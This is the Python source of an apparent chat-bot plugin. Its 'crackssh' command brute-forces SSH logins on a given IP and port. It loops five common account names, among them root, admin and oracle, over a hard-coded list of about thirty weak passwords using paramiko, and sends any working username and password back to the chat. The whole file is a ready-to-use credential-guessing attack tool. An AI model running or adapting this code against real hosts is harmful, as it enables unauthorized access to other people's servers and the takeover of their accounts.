# coding:utf-8
import paramiko
import threading


def check(ip, port, timeout, msg):
    user_list = ['share','root', 'admin', 'oracle', 'weblogic']
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    PASSWORD_DIC = ['share','alpine',
                    'ohshit',
                    '000000',
                    '111111',
                    '11111111',
                    '112233',
                    '123123',
                    '123321',
                    '12345',
                    '123456',
                    '1234567',
                    '12345678',
                    '654321',
                    '666666',
                    '888888',
                    'abcdef',
                    'abcabc',
                    'abc123',
                    'a1b2c3',
                    'aaa111',
                    '123qwe',
                    'qwerty',
                    'qweasd',
                    'admin',
                    'password',
                    'p@ssword',
                    'passwd',
                    'iloveyou',
                    '5201314',
                    'dragon']
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', user))
            try:
                ssh.connect(ip, port, user, pass_, timeout=timeout)
                ssh.close()
                if pass_ == '': pass_ = "null"
                msg.Reply("%s 存在弱口令，账号：%s，密码：%s" % (ip, user, pass_))
            except Exception, e:
                if "Errno 61" in e or "timed out" in e:
                    msg.Reply('扫描异常结束')
                    return
    msg.Reply(ip + ' 扫描结束')


def work(msg,info):
    msg.content = msg.content.strip()
    if msg.content.startswith("crackssh"):
        if not info.get('level', 3) < 3:
            return False
        try:
            host = msg.content.split(' ', 1)[-1]
            port = '22'
            if host.count(' '):
                port = host.split(' ')[-1]
                host = host.split(' ')[0]
            threading.Thread(target=check, args=(host, int(port), 5, msg)).start()
            return '已经添加扫描任务'
        except:
            return help(info)
    else:
        return False


def help(info):
    if not info.get('level',3) < 3:
        return False
    return '#crackssh ip [port] 用于爆破ssh'
